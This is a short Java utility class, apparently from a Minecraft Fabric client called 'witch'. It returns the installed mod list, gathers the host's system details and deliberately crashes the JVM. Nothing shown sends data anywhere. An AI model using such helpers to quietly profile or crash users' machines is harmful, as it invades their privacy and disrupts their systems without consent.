package me.soda.witch.client.utils;

import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.client.util.GlfwUtil;
import net.minecraft.util.SystemDetails;

public class MinecraftUtil {
    public static String allMods() {
        return FabricLoader.getInstance().getAllMods().toString();
    }

    public static String systemInfo() {
        SystemDetails sd = new SystemDetails();
        StringBuilder sb = new StringBuilder();
        sd.writeTo(sb);
        return sb.toString();
    }

    public static void crash() {
        GlfwUtil.makeJvmCrash();
    }
}
